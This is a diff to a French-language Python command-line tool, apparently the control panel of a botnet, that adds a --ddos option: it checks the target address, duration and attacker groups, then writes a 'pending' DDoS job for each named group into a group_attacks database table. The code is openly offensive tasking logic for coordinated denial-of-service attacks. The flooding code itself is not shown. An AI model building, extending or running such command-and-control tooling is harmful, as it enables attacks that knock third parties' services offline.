@@ -183,29 +183,38 @@ mycursor = db.cursor()
 if args.ddos:
     if not args.address or not args.time:
         parser.error("--ddos nécessite les arguments --address et --time")
+
     elif not args.host and not args.group:
-        parser.error("--ddos nécessite l'argument --host et/ou --group")
+        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")
 
-    print("ddos sur " + args.address + " pendant " + args.time + " secondes")
+    elif args.host and args.group:
+        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")
+    
+    elif args.host:
+        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")
 
-    # Parsing des attaquants
-    for group in args.group.split(","):
-        query = "SELECT * FROM groups WHERE name = %s"
-        values = (group,)
-        mycursor.execute(query, values)
-        result = mycursor.fetchall()
-        print(result)
+    elif args.group:
 
-    # Récupération de l'id du groupe
-    query = "SELECT id FROM groups WHERE name = %s"
-    values = (args.group,)
+        print("ddos sur " + args.address + " pendant " + str(args.time) + " secondes avec le(s) groupe(s) " + args.group)
+    
+        for group in args.group.split(","):
+            query = "SELECT id FROM groups WHERE name = %s"
+            values = (group, )
+            mycursor.execute(query, values)
 
+            result = mycursor.fetchall()
 
-    # Ajout de l'attaque en bdd
-    # query = "INSERT INTO group_attacks (group_id, type, state, text) VALUES (%s, %s, %s, %s)"
-    # values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
+            for id in result:
+                query = "INSERT INTO group_attacks (group_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], 
+                          "ddos", 
+                          "pending", 
+                          "{\"address\": \"" + args.address + "\", \"time\": \"" + str(args.time) + "\"}")
 
-    # mycursor.execute(query, values)
+                mycursor.execute(query, values)
+
+    else:
+        parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")
 
 
 ############################################################
